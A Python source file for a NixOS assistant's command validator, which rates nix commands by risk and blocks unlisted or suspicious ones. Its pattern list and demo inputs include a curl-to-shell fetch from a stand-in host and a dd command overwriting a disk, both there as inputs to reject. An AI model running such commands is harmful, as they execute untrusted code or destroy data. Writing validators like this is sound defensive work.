#!/usr/bin/env python3
"""
from typing import Tuple, Dict, List, Optional
Command Validator for Nix for Humanity
Provides additional validation specific to NixOS commands
"""

import logging
import os
import re
from typing import Any

logger = logging.getLogger(__name__)


class CommandValidator:
    """
    Specialized validator for NixOS commands

    This extends the general InputValidator with NixOS-specific
    validation rules and patterns.
    """

    # NixOS-specific allowed commands
    NIXOS_COMMANDS = {
        "nix": {
            "subcommands": [
                "build",
                "develop",
                "flake",
                "profile",
                "repl",
                "run",
                "search",
                "shell",
            ],
            "dangerous_flags": ["--impure", "--no-sandbox"],
        },
        "nix-env": {
            "subcommands": [
                "-i",
                "--install",
                "-e",
                "--uninstall",
                "-u",
                "--upgrade",
                "-q",
                "--query",
            ],
            "dangerous_flags": ["--preserve-installed", "--remove-all"],
        },
        "nixos-rebuild": {
            "subcommands": [
                "switch",
                "boot",
                "test",
                "build",
                "dry-build",
                "dry-activate",
            ],
            "dangerous_flags": ["--install-bootloader", "--fast"],
        },
        "nix-channel": {
            "subcommands": ["--add", "--remove", "--list", "--update"],
            "dangerous_flags": ["--rollback"],
        },
        "nix-collect-garbage": {
            "subcommands": ["-d", "--delete-old"],
            "dangerous_flags": ["--delete-older-than"],
        },
        "home-manager": {
            "subcommands": ["switch", "build", "generations"],
            "dangerous_flags": ["--impure"],
        },
    }

    # Patterns that might indicate malicious intent
    SUSPICIOUS_PATTERNS = [
        r"curl.*\|.*sh",  # Curl pipe to shell
        r"wget.*\|.*bash",  # Wget pipe to bash
        r"/dev/sd[a-z]",  # Direct disk access
        r"dd.*of=/dev/",  # DD to device
        r"mkfs\.",  # Filesystem creation
        r">\s*/dev/sd",  # Redirect to disk
        r"fork\s*\(\s*\)",  # Fork bomb components
    ]

    @classmethod
    def validate_nix_command(
        cls, command: list[str]
    ) -> tuple[bool, str | None, dict[str, Any] | None]:
        """
        Validate a NixOS-specific command

        Args:
            command: Command parts list

        Returns:
            Tuple of (is_valid, error_message, metadata)
        """
        if not command:
            return False, "Empty command", None

        base_command = os.path.basename(command[0])

        # Check if it's a known NixOS command
        if base_command in cls.NIXOS_COMMANDS:
            return cls._validate_nixos_command(base_command, command)
        # Fall back to general validation
        return cls._validate_general_command(command)

    @classmethod
    def _validate_nixos_command(
        cls, base_cmd: str, command: list[str]
    ) -> tuple[bool, str | None, dict[str, Any] | None]:
        """
        Validate a specific NixOS command
        """
        cmd_info = cls.NIXOS_COMMANDS[base_cmd]

        # Check for dangerous flags
        for arg in command[1:]:
            if arg in cmd_info.get("dangerous_flags", []):
                return (
                    False,
                    f"Dangerous flag '{arg}' requires review",
                    {"flag": arg, "risk": "high"},
                )

        # Validate subcommands if specified
        if "subcommands" in cmd_info and len(command) > 1:
            # Check if first argument is a valid subcommand
            if not any(sub in command[1] for sub in cmd_info["subcommands"]):
                logger.warning(f"Unknown subcommand for {base_cmd}: {command[1]}")
                # This is just a warning, not necessarily invalid

        # Special validation for specific commands
        if base_cmd == "nixos-rebuild":
            return cls._validate_nixos_rebuild(command)
        if base_cmd == "nix-env":
            return cls._validate_nix_env(command)
        if base_cmd == "nix":
            return cls._validate_nix_new(command)

        return True, None, {"command": base_cmd, "risk": "low"}

    @classmethod
    def _validate_nixos_rebuild(
        cls, command: list[str]
    ) -> tuple[bool, str | None, dict[str, Any] | None]:
        """
        Special validation for nixos-rebuild
        """
        # Check if user is trying to switch with --install-bootloader
        if "switch" in command and "--install-bootloader" in command:
            return (
                False,
                "Bootloader installation requires manual review",
                {"risk": "high", "reason": "bootloader"},
            )

        # Check for rollback attempts
        if "--rollback" in command:
            return True, None, {"risk": "medium", "action": "rollback"}

        return True, None, {"command": "nixos-rebuild", "risk": "medium"}

    @classmethod
    def _validate_nix_env(
        cls, command: list[str]
    ) -> tuple[bool, str | None, dict[str, Any] | None]:
        """
        Special validation for nix-env
        """
        # Check for mass operations
        if any(arg in command for arg in ["--remove-all", "-e", "*"]):
            return (
                False,
                "Mass removal operations require confirmation",
                {"risk": "high", "reason": "mass_removal"},
            )

        # Extract package names for validation
        packages = cls._extract_packages_from_nix_env(command)
        for pkg in packages:
            valid, reason = cls._validate_package_name(pkg)
            if not valid:
                return False, reason, {"package": pkg}

        return True, None, {"command": "nix-env", "packages": packages, "risk": "low"}

    @classmethod
    def _validate_nix_new(
        cls, command: list[str]
    ) -> tuple[bool, str | None, dict[str, Any] | None]:
        """
        Special validation for new-style nix commands
        """
        # Check for experimental features
        if "--experimental-features" in command:
            features = cls._extract_experimental_features(command)
            if "flakes" in features:
                # Flakes are generally safe
                return True, None, {"risk": "low", "experimental": features}
            return (
                False,
                f"Unknown experimental features: {features}",
                {"risk": "medium"},
            )

        # Check for impure mode
        if "--impure" in command:
            return (
                False,
                "Impure mode requires review",
                {"risk": "high", "reason": "impure"},
            )

        return True, None, {"command": "nix", "risk": "low"}

    @classmethod
    def _validate_general_command(
        cls, command: list[str]
    ) -> tuple[bool, str | None, dict[str, Any] | None]:
        """
        Validate non-NixOS specific commands
        """
        base_command = os.path.basename(command[0])

        # Whitelist of safe general commands
        safe_commands = [
            "ls",
            "pwd",
            "echo",
            "cat",
            "less",
            "more",
            "head",
            "tail",
            "grep",
            "find",
            "which",
            "whereis",
            "df",
            "du",
            "free",
            "ps",
            "top",
            "htop",
            "systemctl",
            "journalctl",
        ]

        if base_command not in safe_commands:
            return (
                False,
                f"Command '{base_command}' not in safe list",
                {"command": base_command},
            )

        # Check for suspicious patterns
        command_str = " ".join(command)
        for pattern in cls.SUSPICIOUS_PATTERNS:
            if re.search(pattern, command_str, re.IGNORECASE):
                return False, "Suspicious pattern detected", {"pattern": pattern}

        return True, None, {"command": base_command, "risk": "low"}

    @classmethod
    def _extract_packages_from_nix_env(cls, command: list[str]) -> list[str]:
        """
        Extract package names from nix-env command
        """
        packages = []
        skip_next = False

        for i, arg in enumerate(command[1:]):
            if skip_next:
                skip_next = False
                continue

            if arg in ["-i", "--install", "-iA"]:
                # Next argument should be package
                if i + 2 < len(command):
                    packages.append(command[i + 2])
                    skip_next = True
            elif arg.startswith("nixpkgs."):
                packages.append(arg)

        return packages

    @classmethod
    def _validate_package_name(cls, package: str) -> tuple[bool, str | None]:
        """
        Validate a package name for safety
        """
        # Remove channel prefix if present
        if package.startswith("nixpkgs."):
            package = package[8:]

        # Check for suspicious patterns
        if any(char in package for char in ["$", "`", "(", ")", "|", "&", ";"]):
            return False, f"Package name contains suspicious characters: {package}"

        # Check length
        if len(package) > 100:
            return False, "Package name too long"

        return True, None

    @classmethod
    def _extract_experimental_features(cls, command: list[str]) -> list[str]:
        """
        Extract experimental features from command
        """
        features = []
        for i, arg in enumerate(command):
            if arg == "--experimental-features" and i + 1 < len(command):
                # Features might be space or comma separated
                feature_str = command[i + 1]
                features.extend(f.strip() for f in re.split(r"[,\s]+", feature_str))

        return features

    @classmethod
    def suggest_safer_alternative(cls, command: list[str], reason: str) -> str | None:
        """
        Suggest a safer alternative to a dangerous command

        Args:
            command: The original command
            reason: Why it was rejected

        Returns:
            Suggested alternative command or None
        """
        base_command = os.path.basename(command[0]) if command else ""

        suggestions = {
            "mass_removal": "Use 'nix-env -e package-name' for specific packages",
            "impure": "Remove --impure flag unless absolutely necessary",
            "bootloader": "Use 'nixos-rebuild switch' without --install-bootloader",
            "experimental": "Consider if experimental features are necessary",
        }

        return suggestions.get(reason)

    @classmethod
    def explain_risk(cls, metadata: dict[str, Any]) -> str:
        """
        Explain the risk level of a command to the user

        Args:
            metadata: Command metadata including risk level

        Returns:
            Human-readable risk explanation
        """
        risk_level = metadata.get("risk", "unknown")
        command = metadata.get("command", "unknown")

        explanations = {
            "low": f"✅ {command} is a safe operation",
            "medium": f"⚠️  {command} will modify your system - preview changes first",
            "high": f"🚨 {command} could significantly impact your system - careful review required",
        }

        base_explanation = explanations.get(risk_level, "Risk level unknown")

        # Add specific warnings
        if metadata.get("reason") == "bootloader":
            base_explanation += "\n   Bootloader changes can affect system boot"
        elif metadata.get("reason") == "mass_removal":
            base_explanation += "\n   This would remove multiple packages at once"
        elif metadata.get("reason") == "impure":
            base_explanation += "\n   Impure mode bypasses reproducibility guarantees"

        return base_explanation


# Demo and testing
def demo():
    """Demonstrate command validation"""
    print("🔒 NixOS Command Validator Demo\n")

    test_commands = [
        # Valid commands
        (["nix-env", "-iA", "nixpkgs.firefox"], True),
        (["nixos-rebuild", "switch"], True),
        (["nix", "search", "firefox"], True),
        (["nix-channel", "--list"], True),
        # Invalid/dangerous commands
        (["nixos-rebuild", "switch", "--install-bootloader"], False),
        (["nix-env", "--remove-all"], False),
        (["nix", "develop", "--impure"], False),
        (["curl", "evil.com/script", "|", "sh"], False),
        (["dd", "if=/dev/zero", "of=/dev/sda"], False),
    ]

    for command, expected_valid in test_commands:
        print(f"\n{'='*50}")
        print(f"Command: {' '.join(command)}")
        print(f"Expected: {'✅ Valid' if expected_valid else '❌ Invalid'}")

        valid, error, metadata = CommandValidator.validate_nix_command(command)

        print(f"Result: {'✅ Valid' if valid else '❌ Invalid'}")
        if error:
            print(f"Reason: {error}")
        if metadata:
            print(f"Risk: {CommandValidator.explain_risk(metadata)}")

        if not valid and CommandValidator.suggest_safer_alternative(
            command, metadata.get("reason", "")
        ):
            print(
                f"Suggestion: {CommandValidator.suggest_safer_alternative(command, metadata.get('reason', ''))}"
            )


if __name__ == "__main__":
    demo()
